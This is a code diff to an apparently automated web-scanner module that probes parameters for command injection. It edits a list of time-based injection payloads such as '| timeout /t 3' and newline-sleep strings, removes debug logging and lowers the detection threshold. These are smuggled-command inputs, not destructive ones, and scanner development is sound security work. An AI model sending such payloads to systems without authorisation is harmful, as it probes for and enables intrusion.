@@ -27,7 +27,6 @@ TIME_PAYLOADS = [
     "& timeout /t 3 &",
     "| timeout /t 3",
     "\nsleep 3\n",
-    "%0a sleep 3 %0a",
 ]
 
 OOB_PAYLOAD_TEMPLATES = [
@@ -77,8 +76,6 @@ class CMDiAttack(BaseAttack):
         all_findings = []
 
         extra_data = attack_point.get("extra_data", {})
-        if method.upper() == "POST":
-            console.print(f"  [dim][CMDi] POST form fields: {list(extra_data.keys())}[/dim]")
 
         # Phase 1 — Time-based (most reliable, serialized)
         time_confirmed = False
@@ -86,14 +83,10 @@ class CMDiAttack(BaseAttack):
             baseline_time = 0.0
             try:
                 t_b = time.monotonic()
-                _br, _ = await self._try_payload(method, url, param, "tweb_cmdi_baseline_noop", data=extra_data)
+                await self._try_payload(method, url, param, "", data=extra_data)
                 baseline_time = time.monotonic() - t_b
-                console.print(
-                    f"  [dim][CMDi] baseline {baseline_time:.2f}s"
-                    f" url={_br.url if _br else 'None'} status={_br.status_code if _br else 'None'}[/dim]"
-                )
-            except Exception as _e:
-                console.print(f"  [dim][CMDi] baseline exc: {_e}[/dim]")
+            except Exception:
+                pass
 
             for payload in TIME_PAYLOADS:
                 if self._should_stop():
@@ -103,12 +96,9 @@ class CMDiAttack(BaseAttack):
                 elapsed = time.monotonic() - t0
 
                 if response is None:
-                    console.print(f"  [dim][CMDi] {payload!r}: response=None[/dim]")
                     continue
 
-                console.print(f"  [dim][CMDi] {payload!r}: {elapsed:.2f}s url={response.url}[/dim]")
-
-                if elapsed >= 2.8 and (elapsed - baseline_time) >= 2.5:
+                if elapsed >= 2.8 and (elapsed - baseline_time) >= 1.5:
                     console.print(
                         f"  [bold red][CMDi][/bold red] Time-based hit! "
                         f"({elapsed:.1f}s, baseline {baseline_time:.1f}s) Payload: {payload!r}"
